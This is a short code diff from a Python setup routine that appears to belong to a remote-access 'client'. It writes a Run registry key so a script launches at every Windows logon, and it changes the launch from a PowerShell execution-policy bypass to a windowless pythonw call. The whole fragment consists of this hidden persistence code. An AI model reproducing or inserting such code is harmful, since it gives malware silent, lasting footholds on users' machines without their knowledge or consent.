@@ -22,7 +22,7 @@ def setup():
             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /d "' + ps1_path + '"',
             shell=True)
     # run client.py file
-    subprocess.call(f'powershell.exe -ExecutionPolicy Bypass {ps1_path}',
+    subprocess.call(f'powershell.exe pythonw {file_path}',
                     shell=True)
 ################################################ done ##################################################################
 # Running code ...
